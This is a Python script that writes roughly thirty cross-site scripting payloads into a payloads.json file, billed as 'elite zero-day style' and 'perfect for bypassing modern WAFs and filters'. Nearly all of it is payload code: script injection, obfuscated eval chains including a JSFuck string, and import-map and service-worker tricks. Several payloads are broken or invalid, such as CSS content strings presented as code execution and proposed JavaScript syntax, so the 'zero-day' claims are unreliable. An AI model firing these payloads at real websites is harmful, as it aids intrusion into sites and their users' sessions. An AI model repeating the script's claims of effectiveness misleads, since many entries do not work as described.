"""Elite XSS Payloads - Zero-Day Style Techniques."""

import json
from pathlib import Path


def generate_elite_payloads():
    """Generate the most advanced and rare XSS payloads."""

    elite_payloads = [
        # Service Worker Based XSS
        {
            "Payload": "<script>navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\\'message\\',e=>eval(e.data))')</script>",
            "Attribute": ["<", ">", "(", ")", "'", ".", ",", "=", ">", "\\"],
            "waf": None,
            "count": 0,
            "description": "Service Worker registration XSS",
            "level": "critical",
        },
        # WebAssembly XSS
        {
            "Payload": "<script>WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAA=')).then(m=>m.instance.exports.alert())</script>",
            "Attribute": ["<", ">", "(", ")", ".", "=", "'", ";", ","],
            "waf": None,
            "count": 0,
            "description": "WebAssembly-based XSS execution",
            "level": "critical",
        },
        # CSS-in-JS XSS
        {
            "Payload": "<style>@supports (display: flex) { body::after { content: '}\\A alert(1)//'; } }</style>",
            "Attribute": ["{", "}", "(", ")", ":", ";", "'", "\\", "/"],
            "waf": None,
            "count": 0,
            "description": "CSS @supports rule injection",
            "level": "high",
        },
        # Proxy Trap XSS
        {
            "Payload": "<script>new Proxy({},{get:(t,p)=>p=='valueOf'?()=>alert(1):t[p]})+''</script>",
            "Attribute": ["<", ">", "(", ")", "{", "}", ":", "=", ">", "?", "'", "+"],
            "waf": None,
            "count": 0,
            "description": "Proxy valueOf trap XSS",
            "level": "critical",
        },
        # Symbol.toPrimitive XSS
        {
            "Payload": "<script>({[Symbol.toPrimitive]:()=>alert(1)})+''</script>",
            "Attribute": [
                "<",
                ">",
                "(",
                ")",
                "{",
                "}",
                "[",
                "]",
                ":",
                "=",
                ">",
                "+",
                "'",
            ],
            "waf": None,
            "count": 0,
            "description": "Symbol.toPrimitive conversion XSS",
            "level": "critical",
        },
        # SharedArrayBuffer XSS (if available)
        {
            "Payload": "<script>try{new SharedArrayBuffer(1);postMessage({cmd:'eval',code:'alert(1)'},'*')}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "(", ")", "{", "}", "'", ":", ",", "*"],
            "waf": None,
            "count": 0,
            "description": "SharedArrayBuffer with postMessage XSS",
            "level": "critical",
        },
        # WebGL Shader XSS
        {
            "Payload": "<canvas id=c><script>c.getContext('webgl').shaderSource(c.getContext('webgl').createShader(35633),'alert(1)');alert(1)</script>",
            "Attribute": ["<", ">", "=", "(", ")", "'", ".", ";"],
            "waf": None,
            "count": 0,
            "description": "WebGL shader source XSS",
            "level": "high",
        },
        # CSS Paint API XSS
        {
            "Payload": "<style>div{background:paint(--xss);}@supports (background:paint(foo)){--xss:url('javascript:alert(1)')}</style><div>",
            "Attribute": ["<", ">", "{", "}", ":", ";", "(", ")", "-", "'", "="],
            "waf": None,
            "count": 0,
            "description": "CSS Paint API XSS",
            "level": "high",
        },
        # Unicode Property Escape XSS
        {
            "Payload": "<script>eval(String.raw`\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029`)</script>",
            "Attribute": ["<", ">", "(", ")", "`", "\\", "u"],
            "waf": None,
            "count": 0,
            "description": "String.raw with unicode escapes",
            "level": "critical",
        },
        # BigInt XSS
        {
            "Payload": "<script>BigInt.prototype.valueOf=_=>alert(1);BigInt(0)+''</script>",
            "Attribute": ["<", ">", ".", "=", "_", ">", "(", ")", "+", "'"],
            "waf": None,
            "count": 0,
            "description": "BigInt prototype pollution XSS",
            "level": "critical",
        },
        # Atomics XSS
        {
            "Payload": "<script>try{Atomics.store(new Int32Array(new SharedArrayBuffer(4)),0,alert(1))}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "(", ")", "{", "}", ","],
            "waf": None,
            "count": 0,
            "description": "Atomics API XSS attempt",
            "level": "critical",
        },
        # ResizeObserver XSS
        {
            "Payload": "<div id=x><script>new ResizeObserver(()=>alert(1)).observe(x);x.style.width='1px'</script>",
            "Attribute": ["<", ">", "=", "(", ")", ".", "'"],
            "waf": None,
            "count": 0,
            "description": "ResizeObserver callback XSS",
            "level": "high",
        },
        # IntersectionObserver XSS
        {
            "Payload": "<div id=x><script>new IntersectionObserver(()=>alert(1)).observe(x)</script>",
            "Attribute": ["<", ">", "=", "(", ")", "."],
            "waf": None,
            "count": 0,
            "description": "IntersectionObserver callback XSS",
            "level": "high",
        },
        # Performance Observer XSS
        {
            "Payload": "<script>new PerformanceObserver(()=>alert(1)).observe({entryTypes:['mark']});performance.mark('x')</script>",
            "Attribute": ["<", ">", "(", ")", "=", ">", "{", "}", "[", "]", "'", "."],
            "waf": None,
            "count": 0,
            "description": "PerformanceObserver XSS",
            "level": "high",
        },
        # CSS Typed OM XSS
        {
            "Payload": "<div id=x><script>try{x.attributeStyleMap.set('--xss',CSS.unparsedValue(['alert(1)']))}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "=", "(", ")", "{", "}", "[", "]", "'", ".", "-"],
            "waf": None,
            "count": 0,
            "description": "CSS Typed OM XSS attempt",
            "level": "high",
        },
        # Web Animation API XSS
        {
            "Payload": "<div id=x><script>x.animate([{transform:'translateX(0px)'}],{duration:1}).onfinish=()=>alert(1)</script>",
            "Attribute": ["<", ">", "=", "(", ")", "[", "]", "{", "}", "'", ":", "."],
            "waf": None,
            "count": 0,
            "description": "Web Animation API callback XSS",
            "level": "medium",
        },
        # Temporal API XSS (future-proof)
        {
            "Payload": "<script>try{Temporal.Now.plainDateISO().toString.call({toString:()=>alert(1)})}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "(", ")", "{", "}", ".", ":", "=", ">"],
            "waf": None,
            "count": 0,
            "description": "Temporal API XSS (when available)",
            "level": "critical",
        },
        # CSS Container Queries XSS
        {
            "Payload": "<style>@container (width > 0px) { body::before { content: '}\\A eval(\\'alert(1)\\')//'; } }</style>",
            "Attribute": ["{", "}", "(", ")", ":", ";", "'", "\\", "/"],
            "waf": None,
            "count": 0,
            "description": "CSS Container Query injection",
            "level": "high",
        },
        # Import Maps XSS
        {
            "Payload": '<script type=importmap>{"imports":{"xss":"data:text/javascript,alert(1)"}}</script><script type=module>import\'xss\'</script>',
            "Attribute": ["<", ">", "=", "{", "}", '"', ":", ",", "'"],
            "waf": None,
            "count": 0,
            "description": "Import Maps XSS",
            "level": "critical",
        },
        # Top Level Await XSS
        {
            "Payload": "<script type=module>await new Promise(r=>setTimeout(r,1));alert(1)</script>",
            "Attribute": ["<", ">", "=", "(", ")", ".", ",", ";"],
            "waf": None,
            "count": 0,
            "description": "Top-level await XSS",
            "level": "high",
        },
        # CSS Cascade Layers XSS
        {
            "Payload": "<style>@layer xss { body::after { content: '}\\A alert(1)//'; } }</style>",
            "Attribute": ["{", "}", "(", ")", ":", ";", "'", "\\", "/"],
            "waf": None,
            "count": 0,
            "description": "CSS Cascade Layers injection",
            "level": "medium",
        },
        # Private Fields XSS
        {
            "Payload": "<script>class X{#x=alert(1);constructor(){this.#x}};new X</script>",
            "Attribute": ["<", ">", "{", "}", "#", "=", "(", ")", "."],
            "waf": None,
            "count": 0,
            "description": "Private class fields XSS",
            "level": "high",
        },
        # WeakRef XSS
        {
            "Payload": "<script>let x=new WeakRef({valueOf:()=>alert(1)});x.deref()+''</script>",
            "Attribute": ["<", ">", "=", "(", ")", "{", "}", ":", "+", "'", "."],
            "waf": None,
            "count": 0,
            "description": "WeakRef valueOf XSS",
            "level": "critical",
        },
        # FinalizationRegistry XSS
        {
            "Payload": "<script>new FinalizationRegistry(()=>alert(1)).register({},1);gc?gc():setTimeout(()=>alert(1),1000)</script>",
            "Attribute": ["<", ">", "(", ")", "=", ">", "{", "}", ".", ",", "?", ":"],
            "waf": None,
            "count": 0,
            "description": "FinalizationRegistry callback XSS",
            "level": "critical",
        },
        # Logical Assignment XSS
        {
            "Payload": "<script>window.x??=alert(1)</script>",
            "Attribute": ["<", ">", ".", "?", "=", "(", ")"],
            "waf": None,
            "count": 0,
            "description": "Logical nullish assignment XSS",
            "level": "medium",
        },
        # Numeric Separators XSS (obfuscation)
        {
            "Payload": "<script>eval(String.fromCharCode(9_7,1_0_8,1_0_1,1_1_4,1_1_6,4_0,4_9,4_1))</script>",
            "Attribute": ["<", ">", "(", ")", ".", "_", ","],
            "waf": None,
            "count": 0,
            "description": "Numeric separators obfuscation",
            "level": "critical",
        },
        # Record and Tuple XSS (future)
        {
            "Payload": "<script>try{#{valueOf:()=>alert(1)}+''}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "(", ")", "{", "}", "#", ":", "=", ">", "+", "'"],
            "waf": None,
            "count": 0,
            "description": "Record syntax XSS (when available)",
            "level": "critical",
        },
        # Pattern Matching XSS (future)
        {
            "Payload": "<script>try{case(alert(1)){when _:1}}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "(", ")", "{", "}", "_", ":"],
            "waf": None,
            "count": 0,
            "description": "Pattern matching XSS (when available)",
            "level": "critical",
        },
        # Decorator XSS (future)
        {
            "Payload": "<script>try{@(()=>alert(1)) class X{};new X}catch(e){alert(1)}</script>",
            "Attribute": ["<", ">", "@", "(", ")", "=", ">", "{", "}", "."],
            "waf": None,
            "count": 0,
            "description": "Decorator syntax XSS (when available)",
            "level": "critical",
        },
        # Ultra-obfuscated mathematical XSS
        {
            "Payload": "<script>(()=>(!![]+'')[+[]]+(!![]+'')[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+'')[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+'')[+[]]+(!![]+[])[+!+[]]+(!![]+'')[+!+[]]+([][[]]+[])[+[]]+(!(+[])+'')[+[]]+(!(+[])+'')[+!+[]]+([][[]]+[])[+!+[]]+(!![]+'')[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+'')[+!+[]]+(!![]+[])[+[]]+(!(+[])+'')[+!+[]]+([][[]]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]])()((![]+'')[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+'')[+[]]+(!![]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+'')[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]((+!+[])+(+!+[])))()</script>",
            "Attribute": ["<", ">", "(", ")", "=", "[", "]", "+", "!", "{", "}", "."],
            "waf": None,
            "count": 0,
            "description": "Ultra-obfuscated JSFuck alert(1)",
            "level": "critical",
        },
    ]

    return elite_payloads


def add_elite_payloads():
    """Add elite payloads to the main payload file."""

    payload_file = Path("payloads.json")

    # Load existing payloads
    with open(payload_file, "r") as f:
        existing_payloads = json.load(f)

    # Add elite payloads
    elite_payloads = generate_elite_payloads()
    all_payloads = existing_payloads + elite_payloads

    # Save back
    with open(payload_file, "w") as f:
        json.dump(all_payloads, f, indent=2)

    print(f"🔥 Added {len(elite_payloads)} ELITE zero-day style payloads!")
    print("💀 These payloads use cutting-edge browser APIs and techniques")
    print("🎯 Perfect for bypassing modern WAFs and filters")

    return len(elite_payloads)


if __name__ == "__main__":
    count = add_elite_payloads()
    print(f"\n🚀 Total elite payloads added: {count}")
    print("\n🔥 Your XSS arsenal is now LEGENDARY! 🔥")
